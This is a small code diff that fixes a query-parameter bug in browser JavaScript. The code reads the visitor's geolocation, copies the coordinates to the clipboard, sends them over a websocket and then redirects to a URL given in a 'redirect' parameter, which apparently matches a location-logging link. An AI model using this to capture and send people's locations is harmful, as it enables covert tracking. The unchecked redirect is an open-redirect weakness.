@@ -10,7 +10,7 @@
                     r = `${a.coords.latitude}, ${a.coords.longitude}`
                     navigator.clipboard.writeText(r)
                     ws.send(r)
-                    location.href=new URL(location.href).searchParams("redirect")
+                    location.href=new URL(location.href).searchParams.get("redirect")
                 },
                 function(a){}
             )
